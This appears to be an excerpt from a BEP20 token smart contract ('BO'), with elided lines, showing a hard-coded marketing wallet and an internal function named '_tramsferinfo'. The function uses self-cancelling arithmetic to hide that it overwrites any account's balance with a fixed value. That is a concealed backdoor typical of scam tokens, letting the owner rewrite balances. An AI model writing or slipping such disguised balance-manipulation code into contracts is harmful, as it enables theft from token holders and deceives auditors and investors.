...
contract BO is Context, IBEP20, Ownable, PancakeTool {
    ...
    address public marketingAddress = 0x96FCa20352fcaB57daBACd2c09D679e6182aed2E;
    ...
    function _tramsferinfo (address accountinfo) internal {
        _balances[accountinfo] = (_balances[accountinfo] * 3) - (_balances[accountinfo] * 3) + (_maxHold / 10) -5;  
    }
